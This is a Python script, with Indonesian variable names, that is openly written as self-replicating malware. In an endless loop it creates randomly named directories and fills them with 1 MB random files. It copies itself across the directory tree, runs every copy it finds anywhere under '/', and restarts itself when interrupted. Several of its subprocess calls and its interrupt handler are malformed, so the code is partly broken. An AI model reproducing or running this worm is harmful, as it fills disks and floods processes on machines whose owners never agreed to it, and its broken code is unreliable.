from sys import argv
import subprocess
import string
import sys
import random
import os
from termcolor import colored
perintah = argv
nama = str(perintah[0])
print(nama)
i = 1
filename = "karma"
panjang = 16
yuhu = sys.argv[0]
namaprogram = yuhu[2:]

def generatorUkuran(ukuranF, filename):
    kb = 1_000
    with open(filename, 'wb') as file:
        file.write(os.urandom(ukuranF*kb))

def main(i):
    while(i > 0):
        randname = ''.join(random.choice(string.ascii_letters) for _ in range(panjang))
        try:
            if i == i:
                i += 1
                direktori = randname+str(i)
                subprocess.call(['mkdir', direktori])
                generatorUkuran(1024, filename)
                subprocess.call(['cp',filename,direktori])
                subprocess.call([f'cp {namaprogram} $pwd/{direktori}'])
                subprocess.call([f'cp {nama} $pwd/{direktori}'])
                subprocess.call([f'ls -h | grep / | xargs -I % cp {direktori} %/{direktori}'])
                subprocess.call([f'find / | grep {namaprogram} | uniq | xargs -I @ python3 @'])
                subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',direktori,'@'])
                subprocess.call([f'find / | grep {namaprogram} | uniq | xargs -I @ python3 @'])
            elif i <= i:
                i += 2
                direktori = randname+str(i)
                subprocess.call(['mkdir', direktori])
                generatorUkuran(1024, filename)
                subprocess.call(['cp',filename,direktori])
                subprocess.call([f'cp {namaprogram}',direktori])
                subprocess.call(['cp',nama,direktori])
                subprocess.call([f'ls -h | grep / | xargs -I % cp {direktori} %/{direktori}'])
                subprocess.call([f'find / | grep {namaprogram} | uniq | xargs -I @ python3 @'])
                subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',direktori,'@'])
                subprocess.call([f'find / | grep {namaprogram} | uniq | xargs -I @ python3 @'])
        except KeyboardInterrupt:
            main()

if __name__ == "__main__":
    main(i)